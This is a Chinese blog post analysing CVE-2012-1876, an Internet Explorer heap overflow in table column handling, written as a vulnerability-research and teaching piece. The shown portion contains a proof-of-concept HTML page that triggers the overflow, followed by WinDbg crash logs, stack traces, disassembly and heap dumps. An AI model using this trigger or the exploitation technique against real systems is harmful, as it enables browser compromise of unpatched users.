<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>IE堆漏洞利用（CVE-2012-1876） | Migraine殇</title><meta name="keywords" content="仍在学习的苦旅中"><meta name="author" content="Migraine殇"><meta name="copyright" content="Migraine殇"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="完整对利用链（包括绕过ASLR）">
<meta property="og:type" content="article">
<meta property="og:title" content="IE堆漏洞利用（CVE-2012-1876）">
<meta property="og:url" content="https://migraine-sudo.github.io/2019/12/01/CVE-2012-1876/index.html">
<meta property="og:site_name" content="Migraine殇">
<meta property="og:description" content="完整对利用链（包括绕过ASLR）">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://migraine-sudo.github.io/img/XsPKP4.jpg">
<meta property="article:published_time" content="2019-12-01T05:07:29.000Z">
<meta property="article:modified_time" content="2023-08-14T03:24:10.001Z">
<meta property="article:author" content="Migraine殇">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Exploit">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://migraine-sudo.github.io/img/XsPKP4.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://migraine-sudo.github.io/2019/12/01/CVE-2012-1876/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="manifest" href="/manifest.json"/><link rel="apple-touch-icon" sizes="180x180" href="/images/icons/icon-512x512.png"/><link rel="icon" type="image/png" sizes="32x32" href="/images/icons/icon-512x512.png"/><link rel="icon" type="image/png" sizes="16x16" href="/images/icons/icon-512x512.png"/><link rel="mask-icon" href="/images/icons/icon-512x512.png" color="#5bbad5"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-08-14 11:24:10'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><meta name="generator" content="Hexo 5.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/%E6%88%88%E8%96%87.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/XsPKP4.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Migraine殇</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">IE堆漏洞利用（CVE-2012-1876）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-12-01T05:07:29.000Z" title="发表于 2019-12-01 13:07:29">2019-12-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-08-14T03:24:10.001Z" title="更新于 2023-08-14 11:24:10">2023-08-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/IE%E6%BC%8F%E6%B4%9E/">IE漏洞</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><div class="note primary modern"><p>阅读辅助：</p>
<p>IE相关漏洞：<a href="https://migraine-sudo.github.io/2019/12/21/Shellcode-Write/">Shellcode编写</a>-&gt;<a href="https://migraine-sudo.github.io/2019/11/07/%E6%B5%8F%E8%A7%88%E5%99%A8UAF/">IE的UAF分析</a>-&gt; <a href="https://migraine-sudo.github.io/2019/12/01/CVE-2012-1876/">IE堆溢出利用</a> </p>
<p>JS Engine相关：<a href="https://migraine-sudo.github.io/2020/02/15/v8/">V8基础</a>-&gt;<a href="https://migraine-sudo.github.io/2019/12/20/qwn2own/">jscore exloit</a>&gt;<a href="https://migraine-sudo.github.io/2020/02/22/roll-a-v8/">roll a d8</a>-&gt;<a href="https://migraine-sudo.github.io/2020/10/06/v8-Instrumentation/">对V8进行插桩</a></p>
<p>CTF相关漏洞：<a href="https://migraine-sudo.github.io/2019/11/22/how2heap1/">how2heap One</a>-&gt;<a href="https://migraine-sudo.github.io/2019/11/25/how2heap2/">how2heap Two</a>-&gt;<a href="https://migraine-sudo.github.io/2020/01/25/how2heap3/">how2heap Three</a>-&gt;<a href="https://migraine-sudo.github.io/2020/01/27/how2heap4/">how2heap Four</a></p>
</div>

<h2 id="概述："><a href="#概述：" class="headerlink" title="概述："></a>概述：</h2><p>CVE-2012-1876是法国安全团队Vupen在Pwn2Own2012上攻破Win7下IE9的两个漏洞之一，利用了<table>标签生成时的堆溢出漏洞，Vupen利用这个漏洞进行信息泄漏绕过ASLR并且成功攻下了IE9，其构造exploit的手法是绕过ASLR的教课书级别的利用。</table></p>
<p>笔者在调试和漏洞分析参考了《漏洞战争》和sakura师傅的文章，很多细节都有大佬做过详细的分析，我单纯的做复读机没有很大意义，所以对漏洞本身仅做浅层的分析。</p>
<p>而漏洞是一个比##较适合研究ASLR绕过的一个案例，从很多漏洞案例中一眼相中这个漏洞，接下里我会从对poc的调试，到着手从利用方面考虑如何绕过ASLR。</p>
<p>分析环境</p>
<table>
<thead>
<tr>
<th>程序</th>
<th align="left">软件版本</th>
</tr>
</thead>
<tbody><tr>
<td>WIN7</td>
<td align="left">SP1(x86)</td>
</tr>
<tr>
<td>IE8</td>
<td align="left">8.0.7601.17514</td>
</tr>
</tbody></table>
<a id="more"></a>


<h2 id="使用HeapPage分析漏洞"><a href="#使用HeapPage分析漏洞" class="headerlink" title="使用HeapPage分析漏洞"></a>使用HeapPage分析漏洞</h2><p>我们使用windbg附加调试POC，开启页堆前，程序并不会崩溃。和我们上一个UAF一样，我们使用gflag打开HPA。</p>
<p>POC代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line"> &lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;</span><br><span class="line">​       &lt;col id&#x3D;&quot;132&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;1&quot; &gt;  &lt;&#x2F;col&gt;</span><br><span class="line"> &lt;&#x2F;table&gt;</span><br><span class="line"> &lt;script&gt;</span><br><span class="line"></span><br><span class="line"> function over_trigger() &#123;</span><br><span class="line">​        var obj_col &#x3D; document.getElementById(&quot;132&quot;);</span><br><span class="line">​        obj_col.width &#x3D; &quot;42765&quot;;</span><br><span class="line">​        obj_col.span &#x3D; 1000;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> setTimeout(&quot;over_trigger();&quot;,1);</span><br><span class="line"></span><br><span class="line"> &lt;&#x2F;script&gt;</span><br><span class="line"> &lt;&#x2F;body&gt;</span><br><span class="line"> &lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>开启页堆之后，附加到IE浏览器上，IE浏览器触发crash。</p>
<p>使用kv回溯栈帧，发现在函数AdjustForCol+0x15触发崩溃的参数edi是通过上层函数传送到了esi。</p>
<p>对mshtml!CTableLayout::CalculateMinMax下断点，重新进行分析。该函数也是这次堆溢出漏洞的元凶。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">(b04.d6c): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax&#x3D;00000009 ebx&#x3D;00414114 ecx&#x3D;04141149 edx&#x3D;00004141 esi&#x3D;07111000 edi&#x3D;07111018</span><br><span class="line">eip&#x3D;6a040a2f esp&#x3D;049bbde8 ebp&#x3D;049bbdf4 iopl&#x3D;0         nv up ei pl nz na pe nc</span><br><span class="line">cs&#x3D;001b  ss&#x3D;0023  ds&#x3D;0023  es&#x3D;0023  fs&#x3D;003b  gs&#x3D;0000             efl&#x3D;00010206</span><br><span class="line">mshtml!CTableColCalc::AdjustForCol+0x15:</span><br><span class="line">6a040a2f 890f            mov     dword ptr [edi],ecx  ds:0023:07111018&#x3D;????????</span><br><span class="line"></span><br><span class="line">0:005&gt; kv</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line">049bbdf4 69eaf47a 00414114 049bc140 00000001 mshtml!CTableColCalc::AdjustForCol+0x15</span><br><span class="line">049bbeac 69d1a6b8 00000001 049bc140 000003e8 mshtml!CTableLayout::CalculateMinMax+0x558</span><br><span class="line">049bc0c8 69d10879 049bc140 049bc10c 00000001 mshtml!CTableLayout::CalculateLayout+0x276</span><br><span class="line">049bc274 69e1566c 049bd8e8 049bc4a0 00000000 mshtml!CTableLayout::CalcSizeVirtual+0x720</span><br><span class="line">049bc3ac 69e118f9 07b22ea8 00000000 00000000 mshtml!CLayout::CalcSize+0x2b8</span><br><span class="line">049bc470 69e11646 07b22ea8 0001e848 0001e848 mshtml!CFlowLayout::MeasureSite+0x312</span><br><span class="line">049bc4b8 69e119c1 08fa8f00 00000061 049bd8e8 mshtml!CFlowLayout::GetSiteWidth+0x156</span><br><span class="line">049bc4f8 69e11f70 090a8fb0 07b22ea8 00000001 mshtml!CLSMeasurer::GetSiteWidth+0xce</span><br><span class="line">049bc57c 6e96665d 092ceff8 049bc59c 049bc660 mshtml!CEmbeddedILSObj::Fmt+0x150</span><br><span class="line">049bc60c 6e966399 08de2efc 00000000 07b30d20 msls31!ProcessOneRun+0x3e9 (FPO: [Non-Fpo])</span><br><span class="line">049bc668 6e966252 08de2f18 0001f791 00000000 msls31!FetchAppendEscCore+0x18e (FPO: [Non-Fpo])</span><br><span class="line">049bc6bc 6e9661c3 00000000 00000000 00000014 msls31!LsDestroyLine+0x47f (FPO: [Non-Fpo])</span><br><span class="line">049bc744 6e96293f 00000007 0000493f 00000000 msls31!LsDestroyLine+0x9ff (FPO: [Non-Fpo])</span><br><span class="line">049bc780 69e0f95e 00000001 00000007 0000493f msls31!LsCreateLine+0xcb (FPO: [Non-Fpo])</span><br><span class="line">049bc8d0 69e20d1e 049bd8e8 00000007 090a8fc0 mshtml!CLSMeasurer::LSDoCreateLine+0x127</span><br><span class="line">049bc974 69e21367 049bd1d8 0001e848 00000000 mshtml!CLSMeasurer::LSMeasure+0x34</span><br><span class="line">049bc9bc 69e21223 00000000 0001f018 00000083 mshtml!CLSMeasurer::Measure+0x1e6</span><br><span class="line">049bc9e0 69e22d7e 0001f018 00000083 08fa8f40 mshtml!CLSMeasurer::MeasureLine+0x1c</span><br><span class="line">049bca90 69e2b89e 049bcfb0 092a2fd8 00000083 mshtml!CRecalcLinePtr::MeasureLine+0x46d</span><br><span class="line">049bd298 69e2b1f1 049bd8e8 00000007 0000000e mshtml!CDisplay::RecalcLines+0x8bb</span><br></pre></td></tr></table></figure>
<p>重新附加IE浏览器进行调试，发现该poc中，mshtml!CTableLayout::CalculateMinMax函数被调用两次。</p>
<p>第一次是poc创建<col id="132" width="41" span="1">  参数的时候，发生的调用。</p>
<p>第二次javascript修改这个col标签参数时，再次调用这个函数。</p>
<p>溢出正是发生在第二次调用。</p>
<p>通过逆向分析AdjustForCol，可以发现程序AdjustForCol仅起到数据复制的作用。</p>
<p>所以需要继续回溯栈帧，分析外部函数CalculateMinMax。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; u mshtml!CTableColCalc::AdjustForCol L50</span><br><span class="line">mshtml!CTableColCalc::AdjustForCol:</span><br><span class="line">6a040a1a 8bff            mov     edi,edi</span><br><span class="line">6a040a1c 55              push    ebp</span><br><span class="line">6a040a1d 8bec            mov     ebp,esp</span><br><span class="line">6a040a1f 8b08            mov     ecx,dword ptr [eax]</span><br><span class="line">6a040a21 53              push    ebx</span><br><span class="line">6a040a22 8b5d08          mov     ebx,dword ptr [ebp+8]</span><br><span class="line">6a040a25 57              push    edi</span><br><span class="line">6a040a26 8bc1            mov     eax,ecx</span><br><span class="line">6a040a28 83e00f          and     eax,0Fh</span><br><span class="line">6a040a2b 8d7e18          lea     edi,[esi+18h]</span><br><span class="line">6a040a2e 50              push    eax</span><br><span class="line">6a040a2f 890f            mov     dword ptr [edi],ecx</span><br></pre></td></tr></table></figure>






<h3 id="第一次调用CalculateMinMax"><a href="#第一次调用CalculateMinMax" class="headerlink" title="第一次调用CalculateMinMax"></a>第一次调用CalculateMinMax</h3><p>CalculateMinMax是用于对Table对象解析的函数，将CTableLayout的地址（Table对象）放在ebx中。</p>
<p>在调用mshtml!CImplAry::EnsureSizeWorker函数之后，程序会申请了一块内存空间为0x70的堆空间。这块空间是用于存放width数据生成的参数的，也是之后我们用于堆溢出的对象，这里我们简称其为vulheap。</p>
<p>vulheap会被放在ebx(CTableLayout)+0x9c的位置。（dd ebx +0 x9c）</p>
<p>值得注意的是，第一次调用时，CTableColCalc::AdjustForCol仅被调用一次。</p>
<p>同时我们观察到span的值也等于1，此时程序向计算机申请了span*0x1c（但最少为0x70）的堆空间。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; u mshtml!CTableLayout::CalculateMinMax L80</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax:</span><br><span class="line">6a7da078 8bff            mov     edi,edi</span><br><span class="line">6a7da07a 55              push    ebp</span><br><span class="line">6a7da07b 8bec            mov     ebp,esp</span><br><span class="line">6a7da07d 81ec98000000    sub     esp,98h</span><br><span class="line">6a7da083 53              push    ebx</span><br><span class="line">6a7da084 8b5d08          mov     ebx,dword ptr [ebp+8] &lt;--CTableLayout地址&lt;--ebx</span><br><span class="line">6a7da087 56              push    esi</span><br><span class="line">6a7da088 8b750c          mov     esi,dword ptr [ebp+0Ch]</span><br><span class="line">6a7da08b 8b4628          mov     eax,dword ptr [esi+28h]</span><br><span class="line">6a7da08e 898570ffffff    mov     dword ptr [ebp-90h],eax</span><br><span class="line">6a7da094 8b4354          mov     eax,dword ptr [ebx+54h]</span><br><span class="line">6a7da097 894508          mov     dword ptr [ebp+8],eax</span><br><span class="line">略</span><br><span class="line">6a7da1a0 8b5508          mov     edx,dword ptr [ebp+8]</span><br><span class="line">6a7da1a3 8bc2            mov     eax,edx</span><br><span class="line">6a7da1a5 2bc1            sub     eax,ecx</span><br><span class="line">6a7da1a7 8945e4          mov     dword ptr [ebp-1Ch],eax</span><br><span class="line">6a7da1aa 6a00            push    0</span><br><span class="line">6a7da1ac 58              pop     eax</span><br><span class="line">6a7da1ad 0f94c0          sete    al</span><br><span class="line">6a7da1b0 894b50          mov     dword ptr [ebx+50h],ecx</span><br><span class="line">6a7da1b3 c1e008          shl     eax,8</span><br><span class="line">6a7da1b6 334344          xor     eax,dword ptr [ebx+44h]</span><br><span class="line">6a7da1b9 2500010000      and     eax,100h</span><br><span class="line">6a7da1be 314344          xor     dword ptr [ebx+44h],eax</span><br><span class="line">6a7da1c1 f6462c01        test    byte ptr [esi+2Ch],1</span><br><span class="line">6a7da1c5 0f8559501900    jne     mshtml!CTableLayout::CalculateMinMax+0x18a (6a96f224)</span><br><span class="line">6a7da1cb 33c0            xor     eax,eax</span><br><span class="line">6a7da1cd 0945c8          or      dword ptr [ebp-38h],eax</span><br><span class="line">6a7da1d0 397d10          cmp     dword ptr [ebp+10h],edi</span><br><span class="line">6a7da1d3 0f855b501900    jne     mshtml!CTableLayout::CalculateMinMax+0x19d (6a96f234)</span><br><span class="line">6a7da1d9 8b8394000000    mov     eax,dword ptr [ebx+94h]</span><br><span class="line">6a7da1df c1e802          shr     eax,2</span><br><span class="line">6a7da1e2 3bc2            cmp     eax,edx</span><br><span class="line">6a7da1e4 7d39            jge     mshtml!CTableLayout::CalculateMinMax+0x223 (6a7da21f)</span><br><span class="line">6a7da1e6 3bd7            cmp     edx,edi</span><br><span class="line">6a7da1e8 8db390000000    lea     esi,[ebx+90h]	;将CTableLayout偏移0x90</span><br><span class="line">6a7da1ee 0f8c8632f0ff    jl      mshtml!CTableLayout::CalculateMinMax+0x203 (6a6dd47a)</span><br><span class="line">6a7da1f4 3b5608          cmp     edx,dword ptr [esi+8]</span><br><span class="line">6a7da1f7 7613            jbe     mshtml!CTableLayout::CalculateMinMax+0x210 (6a7da20c)</span><br><span class="line">6a7da1f9 6a1c            push    1Ch</span><br><span class="line">6a7da1fb 8bc2            mov     eax,edx</span><br><span class="line">6a7da1fd 8bfe            mov     edi,esi</span><br><span class="line">6a7da1ff e89a920c00      call    mshtml!CImplAry::EnsureSizeWorker (6a8a349e);该函数执行结束，申请的内存0x70空间会被放在地址 [ebx+0x90+0xc]，具体带代码需要一路逆向进入函数即可。</span><br></pre></td></tr></table></figure>

<p>大概流程</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshtml!CTableLayout::CalculateMinMax--&gt;mshtml!CImplAry::EnsureSizeWorker--&gt;  mshtml!_HeapRealloc (6a88d7a5)-&gt;HeapRealloc</span><br></pre></td></tr></table></figure>
<p>查看这块内存，就是刚才分配的0x70的内存，也是这个漏洞发生溢出的内存。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; !heap -p -a poi(ebx+0x9c)</span><br><span class="line">address 09af9f90 found in</span><br><span class="line">_DPH_HEAP_ROOT @ 1a1000</span><br><span class="line">in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)</span><br><span class="line">99834ac:          9af9f90               70 -          9af9000             2000</span><br><span class="line">6eb88e89 verifier!AVrfDebugPageHeapAllocate+0x00000229</span><br><span class="line">778c5e26 ntdll!RtlDebugAllocateHeap+0x00000030</span><br><span class="line">7788a376 ntdll!RtlpAllocateHeap+0x000000c4</span><br><span class="line">77855ae0 ntdll!RtlAllocateHeap+0x0000023a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0:005&gt; dd ebx+0x54 &lt;-- spannum</span><br><span class="line">0a3acefc  00000001 ffffffff ffffffff ffffffff</span><br><span class="line">0a3acf0c  ffffffff 6a6da594 00000004 00000004</span><br><span class="line">0a3acf1c  0b044ff0 6a6da594 00000004 00000004</span><br><span class="line">0a3acf2c  07ff3ff0 00000000 00000000 6a6da594</span><br><span class="line"></span><br><span class="line">0:005&gt; dd ebx+0x9c &lt;--vulheap</span><br><span class="line">0a3acf44  09af9f90 00000000 00000000 00000000</span><br><span class="line">0a3acf54  00000000 00000000 00000000 00000000</span><br><span class="line">0a3acf64  00000000 000000c8 000000c8 00000000</span><br><span class="line">0a3acf74  00000000 00000000 00000000 00000000</span><br><span class="line"></span><br><span class="line">0:005&gt; dd ebx+0x94 &lt;--spancmp</span><br><span class="line">0a3acf3c  00000004 00000004 09af9f90 00000000</span><br><span class="line">0a3acf4c  00000000 00000000 00000000 00000000</span><br><span class="line">0a3acf5c  00000000 00000000 00000000 000000c8</span><br><span class="line">0a3acf6c  000000c8 00000000 00000000 00000000</span><br></pre></td></tr></table></figure>




<h3 id="第二次调用CalculateMinMax"><a href="#第二次调用CalculateMinMax" class="headerlink" title="第二次调用CalculateMinMax"></a>第二次调用CalculateMinMax</h3><p>首先对CTableCol::GetAAspan下断点，使用gu命令运行到该函数结束。返回值eax&#x3D;0x3E8（即1000）已是最大值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; gu</span><br><span class="line">eax&#x3D;000003e8 ebx&#x3D;0abccea8 ecx&#x3D;00000002 edx&#x3D;0a8dcff0 esi&#x3D;0a0f0fac edi&#x3D;0aa92fd0</span><br><span class="line">eip&#x3D;6a96f31f esp&#x3D;04afb960 ebp&#x3D;04afba04 iopl&#x3D;0         nv up ei pl nz na po nc</span><br><span class="line">cs&#x3D;001b  ss&#x3D;0023  ds&#x3D;0023  es&#x3D;0023  fs&#x3D;003b  gs&#x3D;0000             efl&#x3D;00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x3ac:</span><br><span class="line">6a96f31f 3de8030000      cmp     eax,3E8h</span><br><span class="line">6a96f31a e8acb3deff      call    mshtml!CTableCol::GetAAspan (6a75a6cb)</span><br><span class="line">6a96f31f 3de8030000      cmp     eax,3E8h</span><br></pre></td></tr></table></figure>


